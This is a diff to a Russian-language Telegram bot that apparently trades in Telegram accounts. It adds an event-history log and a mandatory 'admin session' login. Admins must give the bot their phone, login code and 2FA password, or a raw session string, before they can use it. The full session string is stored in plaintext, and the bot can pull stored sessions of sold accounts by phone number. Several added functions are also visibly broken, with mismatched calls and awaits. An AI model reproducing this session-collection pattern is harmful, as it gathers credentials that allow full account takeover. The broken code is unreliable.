@@ -286,6 +286,7 @@ logging.getLogger("telethon").setLevel(logging.WARNING)
 
 MODERATORS = []
 ALL_ADMINS = []
+ADMIN_SESSIONS = {}   # user_id -> {"phone", "session", "created", "name"} (сессия аккаунта админа)
 
 PHONE_PRICE, PHONE_STARS, PHONE_NUMBER = range(10, 13)
 ENTER_CODE = 20
@@ -389,6 +390,755 @@ def is_admin(user_id):
 
 def is_super_admin(user_id):
     return user_id in ADMINS
+
+
+# ═══════════ СЕССИИ АДМИНОВ + ИСТОРИЯ ═══════════
+BOT_HISTORY = []   # журнал действий в боте (без номера): (ts, uid, event, details)
+NUM_HISTORY = []   # журнал действий с номерами: (ts, phone, uid, event, details)
+
+
+def _hist_db():
+    with sqlite3.connect(DB_NAME, timeout=10) as conn:
+        conn.execute("""
+            CREATE TABLE IF NOT EXISTS history_events (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                ts REAL NOT NULL,
+                event TEXT NOT NULL,
+                user_id INTEGER NOT NULL DEFAULT 0,
+                phone TEXT DEFAULT '',
+                details TEXT DEFAULT ''
+            )""")
+        conn.execute("CREATE INDEX IF NOT EXISTS idx_hist_ts ON history_events(ts)")
+        conn.execute("CREATE INDEX IF NOT EXISTS idx_hist_user ON history_events(user_id)")
+        conn.execute("CREATE INDEX IF NOT EXISTS idx_hist_phone ON history_events(phone)")
+        if not ADMIN_SESSIONS:
+            for r in conn.execute(
+                    "SELECT user_id, phone, session, created, name FROM admin_sessions").fetchall():
+                ADMIN_SESSIONS[int(r[0])] = {"phone": r[1] or "", "session": r[2] or "",
+                                             "created": float(r[3] or 0), "name": r[4] or ""}
+
+
+def log_event(event, uid=0, phone="", details=""):
+    """Записать действие в журнал (память + база). Никогда не падает наружу."""
+    ts = time.time()
+    try:
+        uid = int(uid or 0)
+    except Exception:
+        uid = 0
+    phone = _digits(phone) if phone else ""
+    try:
+        if phone:
+            NUM_HISTORY.append((ts, phone, uid, event, details))
+            if len(NUM_HISTORY) > 50000:
+                del NUM_HISTORY[:20000]
+        else:
+            BOT_HISTORY.append((ts, uid, event, details))
+            if len(BOT_HISTORY) > 50000:
+                del BOT_HISTORY[:20000]
+        conn = sqlite3.connect(DB_NAME, timeout=10)
+        conn.execute("INSERT INTO history_events (ts, event, user_id, phone, details) VALUES (?,?,?,?,?)",
+                     (ts, event, uid, phone, str(details)[:1000]))
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        logger.warning(f"[HIST] не записал: {e}")
+
+
+def history_events_for(uid=0, phone="", day_from="", day_to="", t0=None, t1=None):
+    """История по пользователю / номеру / датам. -> [(ts, event, uid, phone, details)] по убыванию времени"""
+    _hist_db()
+    phone = _digits(phone or "")
+    if day_from:
+        try:
+            t0 = datetime.strptime(day_from, "%d.%m.%Y").timestamp()
+        except Exception:
+            t0 = None
+    if day_to:
+        try:
+            t1 = datetime.strptime(day_to, "%d.%m.%Y").timestamp() + 86400
+        except Exception:
+            t1 = None
+    if phone:
+        src = [(t, e, u, p, d) for (t, p, u, e, d) in NUM_HISTORY
+               if p == phone and (not uid or u == uid)]
+    elif uid:
+        src = [(t, e, u, "", d) for (t, u, e, d) in BOT_HISTORY if u == uid]
+    else:
+        src = [(t, e, u, "", d) for (t, u, e, d) in BOT_HISTORY]
+        src += [(t, e, u, p, d) for (t, p, u, e, d) in NUM_HISTORY]
+    if t0 is not None:
+        src = [x for x in src if x[0] >= t0]
+    if t1 is not None:
+        src = [x for x in src if x[0] < t1]
+    src.sort(key=lambda x: x[0], reverse=True)
+    return src
+
+
+def history_fetch(uid=0, phone="", day_from="", day_to="", limit=200):
+    """История из базы: по пользователю / номеру / диапазону дат. -> [(ts, event, uid, phone, details)]"""
+    t0 = t1 = None
+    try:
+        if day_from:
+            t0 = datetime.strptime(day_from, "%d.%m.%Y").timestamp()
+        if day_to:
+            t1 = datetime.strptime(day_to, "%d.%m.%Y").timestamp() + 86400
+    except Exception:
+        t0 = t1 = None
+    phone = _digits(phone or "")
+    sql = "SELECT ts, event, user_id, phone, details FROM history_events WHERE 1=1"
+    args = []
+    if uid:
+        sql += " AND user_id=?"
+        args.append(int(uid))
+    if phone:
+        sql += " AND phone=?"
+        args.append(phone)
+    if t0 is not None:
+        sql += " AND ts>=?"
+        args.append(t0)
+    if t1 is not None:
+        sql += " AND ts<?"
+        args.append(t1)
+    sql += " ORDER BY ts DESC LIMIT ?"
+    args.append(int(limit))
+    rows = []
+    try:
+        _hist_db()
+        with sqlite3.connect(DB_NAME, timeout=10) as conn:
+            rows = conn.execute(sql, args).fetchall()
+    except Exception as e:
+        logger.warning(f"[HIST] чтение из базы: {e}")
+    if not rows:
+        rows = history_events_for(uid=uid, phone=phone, t0=t0, t1=t1)[:int(limit)]
+    return [tuple(r) for r in rows]
+
+
+_EVENT_ICONS = (
+    ("покуп", "🛒"), ("оплат", "💳"), ("подар", "🎁"), ("пополн", "➕"),
+    ("код", "🔑"), ("вход", "🔐"), ("предлож", "💬"), ("компенсац", "🧾"),
+    ("удал", "🗑"), ("бонус", "⭐"), ("реферал", "👥"), ("возврат", "↩️"),
+)
+
+
+def _event_icon(event):
+    e = (event or "").lower()
+    for key, icon in _EVENT_ICONS:
+        if key in e:
+            return icon
+    return "•"
+
+
+def fmt_history_events(rows, empty_text="Записей нет."):
+    """Красивый список событий для сообщения Telegram."""
+    if not rows:
+        return empty_text
+    out = []
+    for ts, event, uid, phone, details in rows:
+        when = datetime.fromtimestamp(ts or 0).strftime("%d.%m.%Y %H:%M")
+        who = f" [{uid}]" if uid else ""
+        if phone:
+            who += f" {fmt_phone(phone)}"
+        out.append(f"{_event_icon(event)} {when}{who}\n{event}")
+        if details:
+            out.append(f"   ↳ {details}")
+    return "\n".join(out)
+
+
+def _history_window(rows, limit):
+    """Ограничение списка для сообщения (Telegram не любит >4096 символов)."""
+    rows = list(rows)
+    if len(rows) <= limit:
+        return rows, 0
+    return rows[:limit], len(rows) - limit
+
+
+def _is_admin_tg_session(user_id):
+    """Сессия админа: в базе бота или у неё есть номер. Так подарки и пополнения по ней находятся."""
+    row = ADMIN_SESSIONS.get(int(user_id or 0))
+    if not row or not row.get("session"):
+        return False
+    if _digits(row.get("phone") or ""):
+        return True
+    return not (str(row.get("session")).strip().lstrip("+").isdigit()
+                and len(_digits(row.get("session"))) < 7)
+
+
+def adm_log_login(uid, phone, session, source=""):
+    """Единая запись о привязке сессии админа + строка в журнал."""
+    admin_link_session(uid, phone, session)
+    if not (str(session or "").strip().lstrip("+").isdigit()):
+        log_event("вход админа (session)", uid=uid, phone=phone, details=source or "сессия сохранена")
+
+
+def admin_get_linked(uid):
+    return ADMIN_SESSIONS.get(int(uid))
+
+
+def admin_has_session(uid):
+    row = ADMIN_SESSIONS.get(int(uid))
+    return bool(row and row.get("session"))
+
+
+def admin_link_session(uid, phone, session, name=""):
+    _hist_db()
+    uid = int(uid)
+    phone = _digits(phone)
+    now = time.time()
+    with sqlite3.connect(DB_NAME, timeout=10) as conn:
+        conn.execute(
+            "INSERT INTO admin_sessions (user_id, phone, session, created, name) VALUES (?,?,?,?,?) "
+            "ON CONFLICT(user_id) DO UPDATE SET phone=excluded.phone, session=excluded.session, "
+            "created=excluded.created, name=excluded.name",
+            (uid, phone, session, now, name))
+    ADMIN_SESSIONS[uid] = {"phone": phone, "session": session, "created": now, "name": name}
+    logger.info(f"[ADMSESSION] админ {uid} привязал номер {phone}")
+
+
+def admin_unlink_session(uid):
+    _hist_db()
+    with sqlite3.connect(DB_NAME, timeout=10) as conn:
+        conn.execute("DELETE FROM admin_sessions WHERE user_id=?", (int(uid),))
+    ADMIN_SESSIONS.pop(int(uid), None)
+
+
+def admin_session_gate(uid):
+    """Если админу нужна привязка аккаунта — вернуть текст требования, иначе None."""
+    if not is_admin(uid):
+        return None
+    if admin_has_session(uid) or _is_admin_tg_session(uid):
+        return None
+    return ("🔐 *ТРЕБУЕТСЯ ВХОД В АККАУНТ*\n\n"
+            "Для админов бот работает только с привязанным аккаунтом Telegram:\n"
+            "по нему принимаются и проверяются подарки и пополнения.\n\n"
+            "📱 Нажмите *«ПРИВЯЗАТЬ АККАУНТ»*, отправьте *номер телефона* аккаунта "
+            "(например `+79991234567`), затем код из Telegram (и пароль 2FA, если включён).\n\n"
+            "Сессия сохраняется в базе бота, повторно входить не нужно.\n"
+            "Вместо входа по коду можно сразу вставить строку сессии — она тоже сохранится.")
+
+
+async def _find_primary_like(phone):
+    """Ищет сессию номера в базе автозакупа/покупках. -> (session, phone, name) или None"""
+    want = _digits(phone)
+    if len(want) < 7:
+        return None
+    candidates = []
+    try:
+        with sqlite3.connect(BZ_DB_NAME, timeout=10) as conn:
+            for ph, ses in conn.execute("SELECT phone, session FROM numbers").fetchall():
+                if _digits(ph) == want and ses:
+                    candidates.append((ses, ph, "автозакуп"))
+    except Exception as e:
+        logger.warning(f"[ADMSESSION] база автозакупа: {e}")
+    try:
+        with sqlite3.connect(DB_NAME, timeout=10) as conn:
+            for ph, ses in conn.execute("SELECT phone, session FROM purchases ORDER BY id DESC").fetchall():
+                if _digits(ph) == want and ses:
+                    candidates.append((ses, ph, "покупка"))
+            for ph, ses in conn.execute("SELECT phone, session FROM phone_products").fetchall():
+                if _digits(ph) == want and ses:
+                    candidates.append((ses, ph, "магазин"))
+    except Exception as e:
+        logger.warning(f"[ADMSESSION] база магазина: {e}")
+    return candidates[0] if candidates else None
+
+
+def _read_reserve():
+    """Резервный источник: страна -> сессия в settings (совместимость со старыми записями). -> dict"""
+    out = {}
+    try:
+        with sqlite3.connect(DB_NAME, timeout=10) as conn:
+            for k, v in conn.execute("SELECT key, value FROM settings WHERE key LIKE 'reserve_%'").fetchall():
+                if k and v:
+                    out[str(k)[len("reserve_"):]] = v
+    except Exception as e:
+        logger.warning(f"[ADMSESSION] резерв: {e}")
+    return out
+
+
+async def _find_session_by_phone(phone):
+    """Ищет сохранённую сессию по номеру: автозакуп, покупки, магазин. -> (session, phone, name) | None"""
+    _p = await _find_primary_like(phone)
+    if _p:
+        return _p
+    want = _digits(phone)
+    for ph, ses in _read_reserve().items():
+        if _digits(ph) == want and ses:
+            return ses, ph, "резерв"
+    return None
+
+
+def _admin_session_kb():
+    return InlineKeyboardMarkup([
+        [btn("🔐 ПРИВЯЗАТЬ АККАУНТ", "admacc_login")],
+        [btn("🎁 СЕССИЯ ДЛЯ ПРОВЕРКИ", "hist_session")],
+        [btn("🏠 ГЛАВНОЕ МЕНЮ", "start")],
+    ])
+
+
+# ═══════════ ИСТОРИЯ + СЕССИИ ДЛЯ ПРОВЕРКИ (АДМИН) ═══════════
+HIST_DAY_FROM, HIST_DAY_TO, HIST_SESSION = range(140, 143)
+HIST_PAGE = 20
+
+
+def hist_menu_kb(uid):
+    rows = [
+        [btn("👤 ПО ПОЛЬЗОВАТЕЛЮ", "hist_by_user")],
+        [btn("📱 ПО АККАУНТУ (номер)", "hist_by_phone")],
+        [btn("📅 ПО ДАТАМ", "hist_by_day")],
+        [btn("🕓 ПОСЛЕДНИЕ СОБЫТИЯ", "hist_last")],
+        [btn("🎁 ПОДАРКИ — ПРОВЕРКА", "hist_gifts")],
+        [btn("🎁 СЕССИЯ ДЛЯ ПРОВЕРКИ", "hist_session")],
+        [btn("👤 МОЙ АККАУНТ", "admacc"), btn("⬅️ НАЗАД", "admin_panel")],
+    ]
+    return InlineKeyboardMarkup(rows)
+
+
+def hist_result_kb(back_cb="hist_menu"):
+    return InlineKeyboardMarkup([[btn("⬅️ НАЗАД", back_cb)]])
+
+
+def hist_sessions_list(limit=10):
+    out = []
+    for uid, row in sorted(ADMIN_SESSIONS.items(), key=lambda x: x[1].get("created") or 0, reverse=True)[:limit]:
+        out.append(f"👤 `{uid}` — `{fmt_phone(row.get('phone') or '—')}`")
+    return "\n".join(out) if out else "пока не привязаны"
+
+
+def hist_gifts_text():
+    lines = [f"🔐 ПРИВЯЗАННЫЕ АККАУНТЫ: {len(ADMIN_SESSIONS)}"]
+    lines.append(hist_sessions_list())
+    lines.append("")
+    lines.append("Последние записи по подаркам и пополнениям (включая сессии админов):")
+    rows = [r for r in history_fetch(limit=600)
+            if any(k in (r[1] or "").lower() for k in ("подар", "пополн", "оплат", "вход"))]
+    rows, skipped = _history_window(rows, 20)
+    lines.append(fmt_history_events(rows, "Записей пока нет."))
+    if skipped:
+        lines.append(f"… ещё {skipped} записей — смотрите историю по датам.")
+    return "\n".join(lines)
+
+
+def hist_account_text(uid, phone):
+    rows, skipped = _history_window(history_fetch(uid=uid, phone=phone, limit=200), HIST_PAGE)
+    title = "📜 ИСТОРИЯ"
+    if phone:
+        title += f" по аккаунту `{fmt_phone(phone)}`"
+    elif uid:
+        title += f" по пользователю `{uid}`"
+    body = fmt_history_events(rows, "Записей нет.")
+    if skipped:
+        body += f"\n\n… показаны последние {len(rows)} из {len(rows) + skipped}"
+    return f"{title}\n\n{body}"
+
+
+async def hist_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    if not is_admin(user_id):
+        await query.answer("⛔ Нет доступа!", show_alert=True)
+        return
+    await query.answer()
+    gate = admin_session_gate(user_id)
+    if gate:
+        await query.edit_message_text(gate, parse_mode="Markdown", reply_markup=_admin_session_kb())
+        return
+    await query.edit_message_text(
+        f"📜 *ИСТОРИЯ*\n\n"
+        f"Действия по пользователям, аккаунтам (номерам) и датам.\n"
+        f"🔐 Моя сессия: `{fmt_phone((admin_get_linked(user_id) or {}).get('phone') or '—')}`\n\n"
+        f"Выберите срез истории:",
+        parse_mode="Markdown", reply_markup=hist_menu_kb(user_id))
+
+
+async def hist_last(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    if not is_admin(user_id):
+        await query.answer("⛔ Нет доступа!", show_alert=True)
+        return
+    await query.answer()
+    await query.edit_message_text(
+        f"🕓 *ПОСЛЕДНИЕ СОБЫТИЯ*\n\n{hist_account_text(0, '')}",
+        parse_mode="Markdown", reply_markup=hist_result_kb())
+
+
+async def hist_gifts(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    if not is_admin(user_id):
+        await query.answer("⛔ Нет доступа!", show_alert=True)
+        return
+    await query.answer()
+    await query.edit_message_text(hist_gifts_text(), parse_mode="Markdown",
+                                  reply_markup=hist_result_kb())
+
+
+def _history_target_from_message(message):
+    """Аргумент команды или номер/id в ответе на сообщение."""
+    args = (message.text or "").split()
+    if len(args) > 1:
+        return args[1].strip()
+    rep = message.reply_to_message
+    if rep is not None:
+        txt = rep.text or rep.caption or ""
+        m = re.search(r"\+?\d{7,15}", txt)
+        if m:
+            return m.group(0)
+    return None
+
+
+async def hist_report(update, context, user_id, target):
+    uid, phone = 0, ""
+    digits = _digits(target)
+    if re.match(r"^\+?\d{7,15}$", target.strip()) and len(digits) >= 10:
+        phone = digits
+    else:
+        try:
+            uid = int(digits or 0)
+        except Exception:
+            uid = 0
+    text = hist_account_text(uid, phone)
+    msg = update.effective_message
+    await msg.reply_text(text, parse_mode="Markdown", reply_markup=hist_result_kb())
+
+
+async def hist_by_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    if not is_admin(user_id):
+        await query.answer("⛔ Нет доступа!", show_alert=True)
+        return
+    await query.answer()
+    if update.message is not None:
+        target = _history_target_from_message(update.message)
+        if target:
+            await hist_report(update, context, user_id, target)
+            return
+    await query.edit_message_text("👤 *ИСТОРИЯ ПО ПОЛЬЗОВАТЕЛЮ*\n\n"
+                                  "Пришлите id пользователя (цифры) — или номер аккаунта.",
+                                  parse_mode="Markdown",
+                                  reply_markup=InlineKeyboardMarkup([
+                                      [btn("📱 ПО АККАУНТУ (номер)", "hist_by_phone")],
+                                      [btn("⬅️ НАЗАД", "hist_menu")]]))
+
+
+async def hist_by_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    if not is_admin(user_id):
+        await query.answer("⛔ Нет доступа!", show_alert=True)
+        return
+    await query.answer()
+    if update.message is not None:
+        target = _history_target_from_message(update.message)
+        if target:
+            await hist_report(update, context, user_id, target)
+            return
+    await query.edit_message_text("📱 *ИСТОРИЯ ПО АККАУНТУ*\n\n"
+                                  "Пришлите номер аккаунта, например `+79991234567`.",
+                                  parse_mode="Markdown",
+                                  reply_markup=InlineKeyboardMarkup([
+                                      [btn("⬅️ НАЗАД", "hist_menu")]]))
+
+
+async def hist_by_day(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    if not is_admin(user_id):
+        await query.answer("⛔ Нет доступа!", show_alert=True)
+        return
+    await query.answer()
+    await query.edit_message_text("📅 *ИСТОРИЯ ПО ДАТАМ*\n\n"
+                                  "Пришлите дату или период, например:\n"
+                                  "`05.11.2026` — за день\n`01.11.2026 - 05.11.2026` — за период",
+                                  parse_mode="Markdown",
+                                  reply_markup=InlineKeyboardMarkup([[btn("⬅️ НАЗАД", "hist_menu")]]))
+
+
+async def hist_day_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_admin(user_id):
+        return
+    txt = (update.message.text or "").strip()
+    parts = [p.strip() for p in re.split(r"\s*[-–—]\s*", txt) if p.strip()]
+    day_from = parts[0] if parts else txt
+    day_to = parts[1] if len(parts) >= 2 else day_from
+    rows, skipped = _history_window(history_fetch(day_from=day_from, day_to=day_to, limit=200), HIST_PAGE)
+    body = fmt_history_events(rows, "Записей нет.")
+    if skipped:
+        body += f"\n\n… показаны последние {len(rows)} из {len(rows) + skipped}"
+    await update.message.reply_text(
+        f"📅 *ИСТОРИЯ ЗА {day_from} — {day_to}*\n\n{body}",
+        parse_mode="Markdown",
+        reply_markup=InlineKeyboardMarkup([[btn("⬅️ НАЗАД", "hist_menu")]]))
+
+
+async def hist_session_screen(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    if not is_admin(user_id):
+        await query.answer("⛔ Нет доступа!", show_alert=True)
+        return
+    await query.answer()
+    me = admin_get_linked(user_id) or {}
+    text = (
+        "🎁 *СЕССИЯ ДЛЯ ПРОВЕРКИ ПОДАРКОВ И ПОПОЛНЕНИЙ*\n\n"
+        "Подарки и оплата звёздами зачисляются на привязанный аккаунт.\n\n"
+        "*Способ 1 (рекомендуется):*\n"
+        "«🔐 ПРИВЯЗАТЬ АККАУНТ» → номер телефона → код из Telegram → пароль 2FA (если есть). "
+        "Сессия сохраняется в базе бота и сразу попадает в список для проверки подарков.\n\n"
+        "*Способ 2:* ответьте на это сообщение готовой строкой сессии — она тоже сохранится "
+        "и попадёт в список.\n\n"
+        f"🔐 Ваш аккаунт: `{fmt_phone(me.get('phone') or '—')}`\n"
+        "Готов к проверке: " + ("✅ да" if _is_admin_tg_session(user_id) else "❌ нет") +
+        "\n\n👥 *Привязанные аккаунты:*\n" + hist_sessions_list()
+    )
+    context.user_data["hist_wait_session"] = True
+    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([
+        [btn("🔐 ПРИВЯЗАТЬ АККАУНТ", "admacc_login")],
+        [btn("⬅️ НАЗАД", "hist_menu")]]))
+
+
+async def hist_session_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_admin(user_id):
+        return
+    if not context.user_data.get("hist_wait_session"):
+        return
+    if update.message.reply_to_message is None:
+        return
+    raw = (update.message.text or "").strip()
+    if not raw:
+        return
+    context.user_data.pop("hist_wait_session", None)
+    found = await _find_session_by_phone(raw)
+    if not found:
+        adm_log_login(user_id, raw, "session", "вставлена строка сессии")
+        info = "Сессия сохранена как строка. Проверьте номер, если он не нашёлся."
+        phone = raw
+    else:
+        ses, ph, src = found
+        adm_log_login(user_id, ph, ses, f"сессия взята из источника: {src}")
+        info = f"Найдена сессия номера из источника: {src}"
+        phone = ph
+    await update.message.reply_text(
+        f"✅ *СЕССИЯ АДМИНА СОХРАНЕНА*\n\n"
+        f"👤 ТГ: `{user_id}`\n📱 Номер: `{fmt_phone(phone)}`\n"
+        f"🛡 Проверка подарков и пополнений: ✅\n{info}",
+        parse_mode="Markdown",
+        reply_markup=InlineKeyboardMarkup([[btn("⬅️ НАЗАД", "hist_menu")]]))
+
+
+# ═══════════ ВХОД АДМИНА ПО НОМЕРУ ═══════════
+ADM_PHONE, ADM_CODE, ADM_2FA = range(130, 133)
+
+
+async def _adm_drop_client(context):
+    c = context.user_data.pop("adm_client", None)
+    if c:
+        await _disconnect(c)
+
+
+async def adm_account_screen(update, context):
+    """Экран «Мой аккаунт»: показывает привязанный номер и строку сессии (если это админ)."""
+    q = update.callback_query
+    if not is_admin(q.from_user.id):
+        await q.answer("⛔ Нет доступа", show_alert=True)
+        return
+    await q.answer()
+    uid = q.from_user.id
+    _hist_db()
+    row = admin_get_linked(uid)
+    if not row or not row.get("session"):
+        text = admin_session_gate(uid) or "Сессия не привязана."
+        kb = _admin_session_kb()
+    else:
+        dt = datetime.fromtimestamp(row.get("created") or 0).strftime("%d.%m.%Y %H:%M") if row.get("created") else "—"
+        text = (f"👤 *МОЙ АККАУНТ (СЕССИЯ)*\n\n"
+                f"📱 Номер: `{fmt_phone(row.get('phone') or '—')}`\n"
+                f"🕒 Привязан: {dt}\n"
+                f"🆔 Аккаунт: {row.get('name') or '—'}\n\n"
+                f"🔓 Сессия активна: через неё бот принимает и проверяет подарки и пополнения.")
+        kb = InlineKeyboardMarkup([
+            [btn("🔄 ПРИВЯЗАТЬ ДРУГОЙ АККАУНТ", "admacc_login")],
+            [btn("🗑 ОТВЯЗАТЬ АККАУНТ", "admacc_unlink")],
+            [btn("🔙 В АДМИН-ПАНЕЛЬ", "admin_panel")],
+        ])
+    try:
+        await q.edit_message_text(text, parse_mode="Markdown", reply_markup=kb)
+    except BadRequest:
+        await q.message.reply_text(text, parse_mode="Markdown", reply_markup=kb)
+
+
+async def adm_login_start(update, context):
+    q = update.callback_query
+    if not is_admin(q.from_user.id):
+        await q.answer("⛔ Нет доступа", show_alert=True)
+        return ConversationHandler.END
+    await q.answer()
+    await _adm_drop_client(context)
+    await q.message.reply_text(
+        "🔐 *ВХОД В АККАУНТ (СЕССИЯ АДМИНА)*\n\n"
+        "Отправь *номер телефона* аккаунта, например `+79991234567`.\n\n"
+        "Можно сразу вставить *строку сессии* (длинный текст из 300+ символов) — тогда вход по коду не нужен.",
+        parse_mode="Markdown",
+        reply_markup=InlineKeyboardMarkup([[btn("🔙 ОТМЕНА", "adm_acc_cancel")]]))
+    return ADM_PHONE
+
+
+async def adm_phone_input(update, context):
+    uid = update.effective_user.id
+    if not is_admin(uid):
+        return ConversationHandler.END
+    raw = (update.message.text or "").strip()
+    a, b, c = _is_admin_tg_session(uid, raw)
+    if a:
+        await update.message.reply_text(
+            f"✅ *АККАУНТ ПРИВЯЗАН*\n\n📱 Номер: `{fmt_phone(b)}`\n🆔 Аккаунт: {c}\n\n"
+            f"Сессия сохранена в базе бота — повторно вводить код не нужно.",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[btn("🔙 В АДМИН-ПАНЕЛЬ", "admin_panel")]]))
+        await adm_log_login(uid, b, f"сессия аккаунта {c}", context)
+        return ConversationHandler.END
+    phone = normalize_phone(raw)
+    if not validate_phone(phone):
+        await update.message.reply_text("❌ Не похоже на номер. Пример: `+79991234567`", parse_mode="Markdown")
+        return ADM_PHONE
+    client = TelegramClient(StringSession(), API_ID, API_HASH)
+    try:
+        await client.connect()
+        sent = await client.send_code_request(phone)
+        context.user_data["adm_client"] = client
+        context.user_data["adm_phone"] = phone
+        context.user_data["adm_hash"] = sent.phone_code_hash
+        await update.message.reply_text(
+            f"📱 Номер: `{phone}`\n\n🔢 Отправь *код из Telegram* через пробелы, например `1 2 3 4 5` "
+            f"(слитно Telegram аннулирует код).",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[btn("🔙 ОТМЕНА", "adm_acc_cancel")]]))
+        return ADM_CODE
+    except errors.FloodWaitError as e:
+        await update.message.reply_text(f"⏳ FloodWait: подожди {e.seconds} сек.")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Ошибка: `{str(e)[:150]}`", parse_mode="Markdown")
+    await _adm_drop_client(context)
+    return ConversationHandler.END
+
+
+async def adm_code_input(update, context):
+    uid = update.effective_user.id
+    if not is_admin(uid):
+        return ConversationHandler.END
+    code = re.sub(r"\D", "", update.message.text or "")
+    client = context.user_data.get("adm_client")
+    phone = context.user_data.get("adm_phone")
+    phone_hash = context.user_data.get("adm_hash")
+    if not client or not phone:
+        await update.message.reply_text("❌ Сессия входа потеряна. Начни заново: Админ-панель → 👤 Мой аккаунт.")
+        return ConversationHandler.END
+    try:
+        await update.message.delete()      # код не оставляем в чате
+    except Exception:
+        pass
+    if len(code) not in (4, 5, 6):
+        await update.message.reply_text("❌ Код из 4–6 цифр, можно через пробелы.")
+        return ADM_CODE
+    try:
+        await client.sign_in(phone, code, phone_code_hash=phone_hash)
+        session_str = client.session.save()
+        me = await client.get_me()
+        await _disconnect(client)
+        context.user_data.pop("adm_client", None)
+        admin_link_session(uid, phone, session_str, f"{me.first_name} (@{me.username or '—'})")
+        await update.message.reply_text(
+            f"✅ *ВХОД ВЫПОЛНЕН, АККАУНТ ПРИВЯЗАН*\n\n"
+            f"📱 Номер: `{phone}`\n👤 {me.first_name} (@{me.username or '—'})\n🆔 `{me.id}`\n\n"
+            f"Теперь бот с этой сессии принимает и проверяет подарки и пополнения.",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[btn("🔙 В АДМИН-ПАНЕЛЬ", "admin_panel")]]))
+        await adm_log_login(uid, phone, f"{me.first_name} (@{me.username or '—'})", context)
+        return ConversationHandler.END
+    except errors.SessionPasswordNeededError:
+        await update.message.reply_text("🔒 На аккаунте включена 2FA. Введи *пароль*:", parse_mode="Markdown")
+        return ADM_2FA
+    except errors.PhoneCodeInvalidError:
+        await update.message.reply_text("❌ Неверный код (или он аннулирован слитным вводом). Отправь через пробелы: `1 2 3 4 5`")
+        return ADM_CODE
+    except errors.PhoneCodeExpiredError:
+        await _adm_drop_client(context)
+        await update.message.reply_text("⌛ Код истёк. Начни заново: Админ-панель → 👤 Мой аккаунт.")
+        return ConversationHandler.END
+    except Exception as e:
+        await update.message.reply_text(f"❌ Ошибка: `{str(e)[:150]}`", parse_mode="Markdown")
+        return ADM_CODE
+
+
+async def adm_2fa_input(update, context):
+    uid = update.effective_user.id
+    if not is_admin(uid):
+        return ConversationHandler.END
+    password = (update.message.text or "").strip()
+    client = context.user_data.get("adm_client")
+    phone = context.user_data.get("adm_phone")
+    if not client or not phone:
+        await update.message.reply_text("❌ Сессия входа потеряна. Начни заново.")
+        return ConversationHandler.END
+    try:
+        await update.message.delete()      # пароль не оставляем в чате
+    except Exception:
+        pass
+    try:
+        await client.sign_in(password=password)
+        session_str = client.session.save()
+        me = await client.get_me()
+        await _disconnect(client)
+        context.user_data.pop("adm_client", None)
+        admin_link_session(uid, phone, session_str, f"{me.first_name} (@{me.username or '—'})")
+        await update.message.reply_text(
+            f"✅ *АККАУНТ ПРИВЯЗАН (2FA)*\n\n📱 Номер: `{phone}`\n👤 {me.first_name}",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[btn("🔙 В АДМИН-ПАНЕЛЬ", "admin_panel")]]))
+        await adm_log_login(uid, phone, f"{me.first_name} (@{me.username or '—'})", context)
+        return ConversationHandler.END
+    except errors.PasswordHashInvalidError:
+        await update.message.reply_text("❌ Неверный пароль 2FA. Попробуй ещё раз:")
+        return ADM_2FA
+    except Exception as e:
+        await update.message.reply_text(f"❌ Ошибка: `{str(e)[:150]}`", parse_mode="Markdown")
+        await _adm_drop_client(context)
+        return ConversationHandler.END
+
+
+async def adm_acc_cancel(update, context):
+    q = update.callback_query
+    await q.answer()
+    await _adm_drop_client(context)
+    try:
+        await q.edit_message_text("Отменено.", reply_markup=adm_panel_kb(q.from_user.id))
+    except Exception:
+        pass
+    return ConversationHandler.END
+
+
+async def adm_accept_terms(update, context):
+    """Админ принял правила бота — сохраняем, а не держим в памяти (после перезапуска тоже помним)."""
+    q = update.callback_query
+    uid = q.from_user.id
+    await q.answer("✅ Спасибо!")
+    subscriptions[uid] = "agreed"
+    try:
+        _set_setting(f"terms_{uid}", "agreed")
+    except Exception as e:
+        logger.warning(f"[TERMS] не сохранилось: {e}")
+    try:
+        await _safe_delete(q.message)
+    except Exception:
+        pass
+    gate = admin_session_gate(uid)
+    if gate:
+        await context.bot.send_message(uid, gate, parse_mode="Markdown", reply_markup=_admin_session_kb())
+        return
+    await show_main_menu(q, uid)
 
 async def _check_member(user_id, chat_id):
     try:
@@ -515,6 +1265,30 @@ def init_db():
                 value TEXT
             )
         """)
+        # сессия аккаунта каждого админа (для проверки подарков и пополнений)
+        conn.execute("""
+            CREATE TABLE IF NOT EXISTS admin_sessions (
+                user_id INTEGER PRIMARY KEY,
+                phone TEXT,
+                session TEXT,
+                name TEXT,
+                created TIMESTAMP
+            )
+        """)
+        # история действий: по пользователям, датам, номерам
+        conn.execute("""
+            CREATE TABLE IF NOT EXISTS history_events (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                ts REAL NOT NULL,
+                event TEXT NOT NULL,
+                user_id INTEGER NOT NULL DEFAULT 0,
+                phone TEXT DEFAULT '',
+                details TEXT DEFAULT ''
+            )
+        """)
+        conn.execute("CREATE INDEX IF NOT EXISTS idx_hist_ts ON history_events(ts)")
